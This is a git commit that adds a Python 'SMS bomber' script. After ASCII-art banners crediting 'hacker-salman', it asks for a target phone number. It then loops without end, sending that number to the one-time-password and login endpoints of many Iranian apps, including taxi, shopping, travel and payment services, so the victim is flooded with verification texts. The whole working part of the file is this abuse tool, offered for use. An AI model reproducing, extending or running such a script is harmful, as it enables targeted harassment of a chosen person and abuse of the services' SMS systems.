e1d11db1c31b121f89ac0826bb35a07b4cc05217
hacker-salman-hack <125825321+hacker-salman-hack@users.noreply.github.com>
2023-03-21 00:24:41 +0330

    Add files via upload

---
+++ sms.py
@@ -0,0 +1,232 @@
+from requests import get , post
+from time import sleep
+from colorama import Fore
+import os
+import sys
+red='\033[31m'  #قرمز
+green='\033[32m' #سبز
+blue='\033[36m' #ابی
+pink='\033[35m'  #بنفش
+rang='\033[34m' #ابی تیره
+yellow='\033[93m'  #زرد
+os.system("clear")
+print()
+print("\033[36m[Mr salman]")
+sleep(0.5)
+print()
+print("\033[36m[hacker]")
+sleep(0.5)
+print()
+print("[my love zahram]")
+sleep(0.5)
+print()
+print("[/start]")
+sleep(0.5)
+print(f"{red}")
+bomber = (f"""
+                        .xUHWH!! !!?MRDARK:.
+                        .X*#M@$!!  !X!M$$$$$$WWx:.
+                    :!!!!!!?H! :!$!$$$$$$$$$$8X:
+                    !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
+                    :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
+                    ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
+                    !:~~~ .:!M"T#$$$$WX??#MRSALMAN!
+                {red}      ~?WuxiW*   "#$$$$8!!!!??!!!
+                    :X- M$$$$       "T#$T~!8$WUXU~
+                    :%  ~#$$$m:        ~!~ ?$$$$$$
+                :!.-   ~T$$$$8xx.  .xWW- ~""##*"
+        .....   -~~:< !    ~?T#$$@@W@*?$$      /
+        W$@@M!!! .!~~ !!     .:XUW$W!~ "~:    :
+        #"~~.:x%!!  !H:   !WM$$$$Ti.: .!WUn+!
+        :::~:!!:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
+        .~~   :X@!.-~   ?@WTWo("*$$$W$TH$!
+        Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
+        $R@i.~~ !     :   ~$$$$$B$$en:`
+        ?MXT@Wx.~    :     ~"##*$$$$M~
+
+	""")
+for bnr in bomber:
+        sys.stdout.write(bnr)
+        sys.stdout.flush()
+        sleep(0.009)
+print()
+print("sms bomber")
+print()
+print(f"{green}")
+hacker = (f"""
+.7KBQBBBBBBBBBIr
+                        i5RQQP1ri..   ..i7IbQQM2i
+                    rQBBDY.                   .JgBBMr
+                 rBQB7                             vBBBi
+               PBBr                                   vBQI
+             ZBD.                                       .QBX
+           IBg                                             BBv
+          BB.                                               .BB
+        vBY      qq.       ...:r::i.::i::i:..        :dI      XBi
+       DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2
+      BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb
+     gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI
+    YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi
+    B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B
+   BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB
+  .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B
+  BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
+  B  BB DBZ  .:     ..   .i...# hacker #...: .    :       :   BBI.BZ iB
+ jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
+ BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
+ BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
+ BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
+ BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
+ vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
+  B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
+  QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
+   B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B
+   BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ
+    B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B
+    7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:
+     bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ
+      gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI
+       KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY
+        rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:
+          QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB
+           7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi
+             XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu
+               uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv
+                 :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.
+                    idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:
+                        .rv1XZMQQBBBBBBBQQgZSu7i
+
+\033[32mgithub\033[93m>>>\033[32mhttps://github.com/hacker-salman-hack
+\033[32mtelegram\033[93m>>>\033[32mhttps://t.me/dark_hi_999
+
+""")
+for bnr in hacker:
+        sys.stdout.write(bnr)
+        sys.stdout.flush()
+        sleep(0.009)
+print()
+number = input ("\033[32m(09XXXXXX)number target>>> ")
+print (Fore.RED+"\nbomber✔ ",number)
+sleep(0.7)
+print (Fore.RED+"\tstart\n")
+sleep(2)
+
+api0 = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
+api1 = {"cellphone":number}
+api2 = {"api_version":number}
+api3 = {"api_version":number}
+api4 = {"events":number}
+api5 = {"cellNumber":number}
+api6 = "cellNumber="+number
+api7 = {"phone":number}
+api8 = {"phoneNumber":number}
+api9 = "send=1&cellphone="+number
+api10 = {"mobile":number,"country_code":"IR","provider_code":"RUBIKA"}
+api11 = {"status":number}
+api12 = {"r_value":0.04675983630952381,"is_vpv":number}
+api13 = {"username":number}
+api14 = {"tagId":number}
+api2 = {"api_version":number}
+api= {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+
+#################loading##############
+while True:
+    hamid0 = post("https://api.tapsi.cab/api/v2/user", json=api0)
+    if hamid0.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+    hamid = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json=api1)
+
+    if hamid.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+    hamid1 = post("https://messengerg2c70.iranlms.ir/", json=api2)
+
+    if hamid1.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+    hamid2 = post("https://shadmessenger60.iranlms.ir/", json=api3)
+
+    if hamid2.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+    hamid3 = post("https://analytics.metrix.ir/v3/engagement_event", json=api4)
+
+    if hamid3.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+    hamid4 = post("https://app.mydigipay.com/digipay/api/users/send-sms", json=api5)
+
+    if hamid4.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+
+    hamid5 = post("https://bama.ir/signin-checkforcellnumber",data=api6)
+
+    if hamid5.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+
+    hamid6 = post("https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/", json=api7)
+
+    if hamid6.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+
+    hamid7 = post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=api8)
+
+    if hamid7.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+         print (Fore.RED+"error bomber!")
+
+    hamid8 = post("https://web.emtiyaz.app/json/login",data=api9)
+
+    if hamid8.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+    hamid9 = post("https://api.chartex.net/api/v2/user/validate", json=api10)
+    if hamid9.status_code == 200:
+         print (Fore.GREEN+"bomber✔ ", number)
+    else:
+         print (Fore.RED+"error bomber!")
+    hamid10 = post("https://api.zarinplus.com/user/zarinpal-login", json=api11)
+
+    if hamid10.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ", number)
+    else:
+        print (Fore.RED+"error bomber!")
+
+    hamid11 = post("https://in.hotjar.com/api/v2/client/sites/2501013/visit-data?sv=7",json=api12)
+    if hamid11.status_code == 200:
+         print (Fore.GREEN+"bomber✔ ",number)
+    else:
+         print (Fore.RED+"error bomber!")
+
+    hamid12 = post("https://next.zarinpal.com/api/oauth/initialize", json=api13)
+    if hamid12.status_code == 200:
+        print (Fore.GREEN+"bomber✔ ",number)
+    else:
+        print (Fore.RED+"error bomber!")
+
+    hamid13 = post("https://api.mediaad.org/v1/events/tag?fid=7ec75c0a-4b31-4354-bc43-4f92ab49cedc", json=api14)
+    if hamid13.status_code == 200:
+         print (Fore.GREEN+"bomber✔ ", number)
+    else:
+         print (Fore.RED+"error bomber!")
